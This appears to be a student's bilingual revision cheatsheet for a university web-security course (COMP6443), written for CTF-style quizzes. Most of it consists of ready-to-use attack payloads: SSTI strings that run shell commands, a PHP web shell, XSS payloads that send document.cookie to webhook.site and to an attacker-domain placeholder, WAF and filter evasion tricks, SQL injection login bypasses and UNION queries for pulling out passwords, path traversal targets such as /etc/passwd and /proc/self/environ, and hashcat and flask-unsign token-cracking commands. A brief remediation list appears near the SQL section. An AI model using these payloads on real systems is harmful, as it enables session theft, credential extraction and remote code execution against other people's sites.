# My COMP6443 cheatsheet


Some revision notes prepared for final quiz.

# Online tools

- hash analyze: https://www.tunnelsup.com/hash-analyzer/
- md5 / hash: https://crackstation.net/
- jwt: https://www.jwt.io/
- ALL: https://gchq.github.io/CyberChef
https://webhook.site/#!/view/da05aa34-93fb-4cfc-96f0-7f5028b6f4c8


# 常见flag文件 ‼️
`/flag`, `/flag.txt`, `/getflag` - in CTF context
```
/etc/passwd
/proc/self/environ
/proc/self/cwd
/proc/self/cmdline
/flag
/flag.txt
/getflag
server.py
main.py
app.py
app.js
index.js
```


# Signal

| Signal                           | Think                              |
| -------------------------------- | ---------------------------------- |
| login form                       | AuthN bypass, SQLi, username enum  |
| `id`, `user_id`, `account_id`    | IDOR / AuthZ                       |
| `redirect`, `next`, `returnUrl`  | Open redirect / JS URL             |
| file path / filename             | Path traversal / LFI               |
| search/comment/profile fields    | XSS / SQLi / SSTI                  |
| cookies with role/user/admin     | Session tampering                  |
| JWT / Flask token                | Signed token issues                |
| JS files                         | hidden API, credentials, endpoints |
| response delay / 500 / SQL error | injection                          |



# Decode - BruteForce
## wordlist
```sh
cd /Users/xuyuzhu/Documents/xyz-kb/UNSW/6443/homework/topic2/wordlist
```


## JWT
先保存到 jwt.txt 里
```
hashcat -m 16500 jwt.txt ../wordlist/xato-net-10-million-passwords.txt
hashcat -m 16500 jwt.txt rockyou.txt
hashcat -m 16500 jwt.txt /Users/xuyuzhu/Documents/xyz-kb/UNSW/6443/homework/topic2/wordlist/rockyou.txt
```

## Flask token
```sh
## 用wordlist
flask-unsign -u \
--cookie 'eyJ1c2VybmFtZSI6ImFkbWluYWJjIn0.aaUSrg.WYdXh1ryGPBEzoPB_tRuqpc9d4c' \
--no-literal-eval \
--wordlist list.txt

## 只有一个单词的时候
flask-unsign --unsign --cookie "eyJ1c2VybmFtZSI6Inh5eiJ9.abV3JA.TJW_WLsnyX3wi6vljVm-aFJqEto" \
 --wordlist <(echo "com")
 
## with salt
flask-unsign --unsign \  
--cookie 'eyJ1c2VybmFtZSI6ImFkbWluYWJjIn0.aZ8IGg.A4ESH1AyxYK7sQO05Xhfdm7r4Fc' \  
--wordlist wordlist.txt \  
--no-literal-eval \  
--salt flask
```

# AuthZ / IDOR  
  
看到这些参数立刻测：  
- id  
- user_id  
- account_id  
- order_id  
- file_id  
- email  
- username  
- role  
- isAdmin  
  
测试方法：  
1. 建两个账号 A/B  
2. 用 A 登录，访问 A 的资源  
3. 把 id/user_id/file_id 改成 B 的  
4. 看是否能读/改/删 B 的资源  
5. 普通用户尝试访问 admin endpoint  
  
重点：  
- 前端隐藏按钮不等于后端有权限控制  
- 每个对象访问都要服务端做 object-level permission check  
- 403 说明可能方向对了，继续找下级路径或换 method


# SSRF
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
## SSTI
查看http response header，看是什么渲染引擎
### 基础payload
```
{{7*7}}
${7*7}
<%= 7*7 %>
$({7*7})
#{7*7}
```
https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#python

### 常见flag
```
{{config}}
{{config.items()}}
{{settings.SECRET_KEY}}
{"secret":"{{config}}"}
{"secret":"{{config.SECRET_KEY}}"}
{"secret":"{{ config.__class__.__init__.__globals__['os'].popen('env').read() }}"}
{"secret":"{{self.__dict__}}"}
{"secret":"{{ config.__class__.__init__.__globals__['os'].popen('ls -F').read() }}"}
{"secret":"{{ config.__class__.__init__.__globals__['os'].popen('cat flag').read() }}"}

## 执行OS命令（command injection） - Flask SSTI
{{ config.__class__.__init__.__globals__['os'].popen('env').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('ls -F').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('cat flag').read() }}

## 执行OS命令（command injection） - Jinja2 SSTI
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('/getpassword').read()}}


## Nunjucks payload
{{constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}}
{{constructor.constructor('return process')().mainModule.require('child_process').execSync('cat server.js')}}
```


## Command Injection
```
$(ls ../../../../proc/self/cwd)
```
- 参数名为： `host`, `ip`, `cmd`, `url`, `file`


## PHP cmd
```php
<?php echo system($_GET['cmd']); ?>
<?php echo file_get_contents('/password.txt'); ?>
```
[[6_PHP up]]



# XSS
btoa: 编码
atob: 解码

source = 不可信数据从哪里来  
sink = 不可信数据最后流到哪里去

Ask:

1. Is my input reflected/stored?      我提交的内容 reflect 在哪里了？ 存起来了，还是在哪里展示
2. Where is it reflected?   
3. What context is it in?                    处理逻辑如何，在哪里展示了？
4. What characters are escaped?   是否有字符串 escape
5. What does CSP allow?                 是否 CSP 允许

## 基础payload
```HTML
<h1>a</h1>
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<img src=x onerror="fetch('https://webhook.site/81d73791-1083-421a-9a54-2d49b0bc6bd7?flag='+document.cookie)">
javascript:alert(1)
```


## 单引号拼接

==fetch== 样例
```html
fetch("https://webhook.site/<webhook id>?flag=" + btoa(document.cookie));

fetch("https://webhook.site/81d73791-1083-421a-9a54-2d49b0bc6bd7?flag=" + document.cookie);

fetch('/reports').then(r=>r.text()).then(h=>report('REPORTS_LIST', h));
```


## CSP
https://www.vaadata.com/en/blog/content-security-policy-bypass-techniques-and-security-best-practices/

| CSP第一个单词     | 值                 | 支持                                                                                                                |
| ------------ | ----------------- | ----------------------------------------------------------------------------------------------------------------- |
| `script-src` | `self`            | ` <script src="/app.js"></script>`                                                                                |
|              | `'unsafe-inline'` | 1、`<script>alert(1)</script>`<br>2、`<img src=x onerror=alert(1)>` <br>3、`<button onclick=alert(1)>Click</button>` |
- 可以上传自己的js文件
- 可以用img onerror

```
<script src="/profileimage/z5723016.js" />
```

```
<img src=x onerror=alert(1)/>
```


## NO-CORS
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#cors
```
<script>
  fetch('https://[ATTACKER.DOMAIN.TLD]', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
  });
</script>
```


## URL参数 - eval

URL 注入
```
javascript:alert(1)
/aa?redirect=javascript:eval(atob(%27<base64的fetch代码>%27))
```


## 关键字拦截
- 有`script` `fetch`==关键字拦截==时，用`img` `onerror` 事件
```
<img src=x onerror="fetch('https://webhook.site/<webhook id>?flag='+document.cookie)"/>

```

- 有==点号==、==引号==拦截 --- 用atob，以及`windows['']` 的方式取值
```
fetch(atob(`WEBHOOK_URL`) + document[`cookie`])
```

```
dcreat=<<script >ascript src="/clients.jsonp?q=1%26callback=fetch(atob(`aHR0cHM6Ly93ZWJob29rLnNpdGUvNDhlNjljMDQtNmRiYS00NTQ2LWFmNDgtMDViODkwMjNiMDFlP2M9`)[`concat`](document[`cookie`]))//">
```
- 没有 `+` -------> 改成了 `[`concat`]`，不怕变空格
- 没有**点号** `.` -------> 全部使用 **中括号** 访问属性，不怕点号过滤
- 没有**引号** -------> 全部使用 **反引号**
- 编码了 `&` -------> 使用 `%26` 确保 `callback` 参数不会被 POST 表单截断
- 有 ==window== 字符串拦截 -------> **用atob**

## markdown注入
```
![x]("onerror="fetch('https://webhook.site/d84f39a8-5126-4a4c-b856-f23e805329ab?f='+document.cookie)")
```

## svg注入script
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    fetch('https://webhook.site/<webhook id>?flag='+document.cookie);
  </script>
  <rect width="100" height="100" fill="blue" />
</svg>
```

## base标签注入
```
<base href="https://yiya-dev.oss-cn-hangzhou.aliyuncs.com/">
```
## cors 跨域
```JS
async function getNote() {
    const resp = await fetch(`${API}/note?cors-allow-origin=${encodeURIComponent(MY_ORIGIN)}`, {credentials: "include"});
    const txt = await resp.text();
    conso.log(txt);
}
```

## 打开mobile 分辨率：HTML注释

## CSRF
条件：  
1. 用户已登录  
2. 浏览器会自动带 cookie  
3. 存在 state-changing action  
4. 没有 CSRF token / SameSite / Origin check

## CORS  
  
危险配置：  
Access-Control-Allow-Origin: attacker-controlled origin  
Access-Control-Allow-Credentials: true  
  
测试：  
- 是否反射 Origin  
- 是否允许 credentials  
- 是否能读取敏感 response

## Clickjacking  
  
测试：  
- 页面能不能被 iframe 嵌入  
  
防御：  
X-Frame-Options: DENY / SAMEORIGIN  
CSP: frame-ancestors 'none' / 'self'

# SQLI


确认注入点  
→ 判断列数  
→ 找回显位  
→ 查 database()  
→ 查 information_schema.tables  
→ 查 information_schema.columns  
→ 查目标表数据


## 确认SQLI

```
'  
"  
')  
")  
'--  
' -- -  
'#
' or 1=1 -- -
```
- 注意：-- 是单行注释，也就是对换行后的SQL不生效

### 布尔盲注 Boolean-based SQLi

真：页面正常 / 登录失败但提示不同 / 返回商品列表  
假：页面空白 / 报错 / 返回内容长度不同

```
admin' AND 1=1 -- -
admin' AND 1=2 -- -
```

如果两次页面表现不同，说明可以用布尔盲注。

### 时间盲注 Time-based SQLi
```
有注入的话应该会有页面延迟
admin' AND SLEEP(5) -- -

admin' AND IF(1=1,SLEEP(5),0) -- -
```

### 报错注入 Error-based SQLi
```
updatexml() ---比较多
extractvalue() ---比较多
floor(rand())
```
爆出数据库名称
```
admin' AND updatexml(1,concat(0x7e,database(),0x7e),1) -- -
```
可能报错类似：
```
XPATH syntax error: '~challenge-db~'
```



## 判断列数
直到报错
```
' union select 1 -- -
' union select 1,1 -- -
' union select 1,1,1 -- -

或者
' ORDER BY 1 -- -  
' ORDER BY 2 -- -  
' ORDER BY 3 -- -  
```

## 查询数据库信息

### 查库名
```
' UNION SELECT 1,2,3,database() -- -
```

### 查**当前库**里的所有 table_name 名
```
select table_name,1 from information_schema.tables where table_schema=database() -- -
select table_name,1 from information_schema.tables where table_schema='challenge-db' -- -

```

```
' union select 1,column_name,3,4 from information_schema.columns where table_name='flags' -- -
' UNION SELECT 1,3,4,column_name  FROM information_schema.columns WHERE table_name='flags' limit 1 offset 1 -- -
```


### 查**某个table下**的所有 column 名
```
select column_name from information_schema.columns where table_name='flags' -- -
```

查具体某个 column 的值

```
" UNION SELECT 1,1,1,reason,1,1,1,1 from upcoming_layoffs #
' UNION SELECT 1,3,4,flag_text FROM flags -- -
```

## 常见flag所在位置‼️

**table_name**
```
flag
flags
flag_table
ctf
secret
secrets
admin
users
user
accounts
config
settings
challenge
```

**column name**
```
flag
flags
value
secret
secret_key
key
token
password
passwd
content
data
description
remark
note
```

SQL - 也可能在 “用户“ 表
```
SELECT flag FROM flags;
SELECT value FROM flag;

-- 或者在 “用户” 表里
SELECT username, password FROM users;
SELECT username, flag FROM users;
SELECT secret FROM admin;
```

**flags**
schema_name in ('flag' or 'flags')
table_name in ('flag' or 'flags')
column_name in ('flag' or 'flags')


## SQLI WAF 
1. 确认注入类型：字符型、数字型、括号闭合、登录型、搜索型  
2. 确认被拦的是关键字、空格、引号、注释符，还是某种模式  

```
'  
"  
--  
#  
;  
=  
空格  
逗号  
括号
```

1. 看拦截发生在前端、后端应用、还是 WAF 层  
2. 尝试大小写、注释、空白替代  
	- union  
	- select  
	- sleep  
	- or  
	- and  
	- information_schema
	- 例如它只匹配小写 `union select`，但没有做规范化，就可能被大小写或注释干扰。
		- 中间加注释： `union /**/ select`
3. 尝试逻辑符号替代：OR / ||，AND / &&  
4. 尝试比较符替代：= / LIKE / IN / BETWEEN  
5. 字符串被拦时考虑 hex  
6. information_schema 被拦时考虑猜表名、猜字段名  
7. UNION 不通时转布尔盲注、时间盲注、报错注入  
8. 最后根据数据库类型调整语法



### SQLI 拦截 Rules - bypass ⭕️

| 拦截对象                        | 原来的                                       | 替换成                                                       |
| --------------------------- | ----------------------------------------- | --------------------------------------------------------- |
| 逻辑运算符                       | OR                                        | \|\|                                                      |
|                             | AND                                       | &&                                                        |
|                             | ' OR 1=1 -- -                             | ' \|\| 1=1 -- -                                           |
|                             |                                           |                                                           |
| 比较符号                        | 1=1                                       | 1 LIKE 1<br>1 IN (1)                                      |
|                             | `substr(database(),1,1)='a'`              | `substr(database(),1,1) LIKE 'a'`                         |
|                             | LIKE<br>IN<br>BETWEEN<br>REGEXP<br><<br>> |                                                           |
|                             |                                           |                                                           |
| 注释符号                        | ` --`                                     | 用 `##`                                                    |
|                             |                                           |                                                           |
| 字符串 **值**编码                 | admin / flag / users                      | 十六进制（看下面的表）                                               |
|                             |                                           |                                                           |
| 大小写                         | UNION SELECT                              | UnIoN SeLeCt                                              |
|                             | OR                                        | `Or` / `OorR`                                             |
| 空格：用注释 `/**/` 替代<br>==经常考== | `union select`                            | ``union/**/select``                                       |
|                             | `UNION SELECT 1,2,3`                      | `UNION/**/SELECT/**/1,2,3`                                |
|                             |                                           | `'/**/OR/**/'1'='1'/**/LIMIT/**/8,1#`                     |
|                             | `OR 1=1`                                  | `OR/**/1=1`                                               |
|                             | information_schema                        | `information/**/_schema`                                  |
|                             |                                           |                                                           |
| 函数替换                        | substring  <br>                           | substring(str,1,1)  <br>substr(str,1,1)  <br>mid(str,1,1) |
|                             | ascii  <br>                               | ascii()<br>ord()<br>hex()<br>bin()                        |
|                             | sleep                                     |                                                           |
- 复杂的union select 偷换
```
' UNION SELECT 1,2,3,database() -- -

---->

'/**/UNION/**/SELECT/**/1,2,3,database()/**/-- -

' UnIoN SeLeCt 1,2,3,database() -- -

```

- 十六进制替换敏感词

| Text    | Hex          |
| ------- | ------------ |
| 'admin' | 0x61646d696e |
| 'users' | 0x7573657273 |
| 'flag'  | 0x666c6167   |
| 'flags' | 0x666c616773 |
| ~       | 0x7e         |

WHERE table_name=0x666c616773
- 注意，这里不需要 "额外的单引号"



## 直接拿username / password

username
```
下面2个等价，LIMIT后 第一个 “1” 是offset

' UNION SELECT username FROM users LIMIT 1 OFFSET 1 -- 
' UNION SELECT username FROM users LIMIT 1,1 -- -

-----
username: admin' or '1'='1
password: 随意
-----
```

password:
```
' UNION SELECT password FROM users -- -
' UNION SELECT GROUP_CONCAT(password_digest) FROM users -- -

```

username:       admin' or '1'='1
password: 随意

' or 1=1 -- -
' UNION SELECT password FROM users LIMIT 10,1 -- -

### 登陆绕过 payload ‼️ ⭕️

```
' OR 1=1 -- -
admin' -- -


' OR '1'='1' -- -  
' OR 1=1 -- -  
admin' -- -  
admin' #  
admin'/*  
" OR "1"="1" -- -  
') OR ('1'='1' -- -  
') OR 1=1 -- -  
'or'1'='1  
'or 1=1#
admin\

```



#### 特殊payload
username:     admin\
password:     OR 1=1 #
- 思路： 破坏原来的sql语句中的单引号
```SQL
select * from users where username='?' and password='?'

select * from users where username='admin\' and password='OR 1=1 #'
>>> username里的\会将原来sql中的单引号转义了，导致username的值变成“admin\' and password=”
```


### login 绕过的步骤 ‼️‼️
1. 测 username 单引号/双引号是否报错  
2. 测 password 单引号/双引号是否报错  
3. 测 admin' -- - 是否能绕过密码  
4. 测 ' OR 1=1 -- - 是否能绕过认证  
5. 测 AND 1=1 / AND 1=2 是否存在布尔差异  
6. 测 SLEEP(5) 是否存在时间盲注  
7. 如果有回显，再考虑 UNION SELECT  
8. 最后枚举 database、tables、columns

## 拿到第一个 offset
```
' OR 1=1 limit 1 --  拿第一个用户
' OR 1=1 limit 1 OFFSET 1 --  拿第二个用户

' UNION SELECT GROUP_CONCAT(password_digest) FROM users -- -
```

## 不要忘记 GROUP_CONCAT

-  默认用**逗号**连接 `GROUP_CONCAT(column_name)`, 例如
	- `' UNION SELECT GROUP_CONCAT(password_digest) FROM users -- -`
- **自定义**连接符 `GROUP_CONCAT(column_name SEPARATOR '~')`，例如
	- `' UNION SELECT GROUP_CONCAT(username SEPARATOR '~') FROM users -- -`
- 同时拼接多个字段:
	- `SELECT GROUP_CONCAT(username, ':', role SEPARATOR '~')   FROM users;`
- MySQL group_concat 有长度限制，可以用 `substr` 分段来展示
	- `' UNION SELECT SUBSTR(GROUP_CONCAT(username SEPARATOR '~'),1,100) FROM users`
	- `' UNION SELECT SUBSTR(GROUP_CONCAT(username SEPARATOR '~'),101,100) FROM users`

```

' UNION SELECT GROUP_CONCAT(column_name SEPARATOR '~')  
FROM information_schema.columns  
WHERE table_schema = database()  
AND table_name = 'users'  
-- -
```

```
' UNION SELECT GROUP_CONCAT(username SEPARATOR '~')  
FROM users  
-- -
```

```
' UNION SELECT GROUP_CONCAT(username, ':', flag SEPARATOR '~')  
FROM users  
WHERE username != 'admin'  
-- -
```


## remediation
1. 参数化查询 / prepared statement  
2. 严格输入类型校验  
3. 最小权限数据库账号  
4. 关闭详细 SQL 报错  
5. 统一登录失败提示  
6. 限制异常请求频率  
7. WAF 先做规范化：URL decode、大小写归一、注释归一、空白归一  
8. 检测语义而不是只检测字符串  
9. 对盲注行为做速率和模式检测

# Path Traversal
| command                                                                       | memo                       |                        |
| ----------------------------------------------------------------------------- | -------------------------- | ---------------------- |
| ../../../proc/self/cmdline                                                    |                            |                        |
| /proc/self/environ                                                            |                            | cat /proc/self/environ |
| /proc/self/cwd                                                                | 一个指令，获得当前目录                |                        |
| /proc/self/stat                                                               | 一个文件，获得当前进程（self）状态的详细统计信息 |                        |
| /proc/self/fd<br>	/proc/self/fd/0<br>	/proc/self/fd/1<br>	/proc/self/fd/2<br> |                            |                        |



 - `../`
- `../../../../../../../../../../../../etc/passwd` -- great way t check for path traversal
- `server.py`,`main.py`, app.py, app.js, index.js,
- `/proc/self/environ` for secrets
- `/proc/self/cwd` - for the current working directory
- `/prod/self/cmdline` - for the current process's command
- ==`/flag`, `/flag.txt`, `/getflag` - in CTF context==
- `/var/nginx/www`  - for nginx / php static upload path: 
- `/etc/apach2/httd.conf,` `/etc/nginx/nginx.conf`, `/etc/caddy/CaddyFile` --for web server config files

## 常见flag位置‼️
```
/etc/passwd
/proc/self/environ
/proc/self/cwd
/proc/self/cmdline
/flag
/flag.txt
/getflag
server.py
main.py
app.py
app.js
index.js
```

Web server configs: ---> 找到main.py

```text
/etc/nginx/nginx.conf
/etc/apache2/apache2.conf
/etc/caddy/Caddyfile
```

Common web roots:

```text
/var/www/html
/usr/share/nginx/html
/var/nginx/www
```
### 在文件路径后追加相对路径 ../../ 等
download?filename=abc/../slide.ppt

## LFI: Local File Inclusion
基本上只有PHP
常见参数：
- `page=`
- `template=`
- `view=`
- `lang=`
- `file=`
- `theme=`





# HTTP Method / Content-Type Bypass

尝试换 method：
- GET -> POST
- POST -> GET
- PUT / PATCH / DELETE
- HEAD / OPTIONS

尝试换 Content-Type：
- application/x-www-form-urlencoded
- application/json
- multipart/form-data
- text/plain

常见点：
- 后端只检查某个 method
- WAF 只拦 form，不拦 JSON
- 参数同时出现在 query 和 body 时，后端取值顺序不同
- JSON 里布尔值 true/false 可能比字符串更有用

例子：
role=user
role=admin
isAdmin=false
isAdmin=true


# Init Python venv

```shell
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

```



